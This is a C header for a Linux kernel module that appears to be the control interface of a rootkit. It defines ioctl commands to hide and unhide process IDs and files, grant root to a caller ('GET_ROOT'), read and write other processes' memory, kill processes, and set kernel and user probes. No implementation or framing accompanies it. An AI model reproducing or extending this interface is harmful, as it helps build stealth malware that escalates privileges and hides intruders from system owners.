#ifndef JKY_IOCTL_H
#define JKY_IOCTL_H

#include <linux/ioctl.h>
#include <linux/types.h>

#define JKY_MAGIC 'J'

struct jky_req {
    __s32 pid;
    __u64 addr;
    __u64 size;
    char  path[256];
    char  pad[64];
};

struct jky_trace_event {
    __u64 ts_ns;
    __s32 pid;
    __s32 id;
    __u64 arg0, arg1, arg2, arg3;
    char  name[64];
};

struct jky_trace_req {
    char  symbol[128];
    char  path[256];
    __u64 offset;
    __s32 id;
    __s32 max_events;
};

#define JKY_CMD_HIDE_PID       _IOW(JKY_MAGIC, 1, struct jky_req)
#define JKY_CMD_UNHIDE_PID     _IOW(JKY_MAGIC, 2, struct jky_req)
#define JKY_CMD_HIDE_FILE      _IOW(JKY_MAGIC, 3, struct jky_req)
#define JKY_CMD_UNHIDE_FILE    _IOW(JKY_MAGIC, 4, struct jky_req)
#define JKY_CMD_GET_ROOT       _IO (JKY_MAGIC, 5)
#define JKY_CMD_READ_MEM       _IOWR(JKY_MAGIC, 6, struct jky_req)
#define JKY_CMD_WRITE_MEM      _IOW(JKY_MAGIC, 7, struct jky_req)
#define JKY_CMD_KILL_PID       _IOW(JKY_MAGIC, 8, struct jky_req)

#define JKY_CMD_KPROBE_ADD     _IOWR(JKY_MAGIC, 20, struct jky_trace_req)
#define JKY_CMD_KPROBE_REMOVE  _IOW (JKY_MAGIC, 21, struct jky_trace_req)
#define JKY_CMD_UPROBE_ADD     _IOWR(JKY_MAGIC, 22, struct jky_trace_req)
#define JKY_CMD_UPROBE_REMOVE  _IOW (JKY_MAGIC, 23, struct jky_trace_req)
#define JKY_CMD_TRACE_READ     _IOWR(JKY_MAGIC, 24, struct jky_trace_req)
#define JKY_CMD_TRACE_CLEAR    _IO  (JKY_MAGIC, 25)
#define JKY_CMD_TRACE_LIST     _IOWR(JKY_MAGIC, 26, struct jky_trace_req)

#define JKY_CMD_PING           _IO (JKY_MAGIC, 99)

#endif
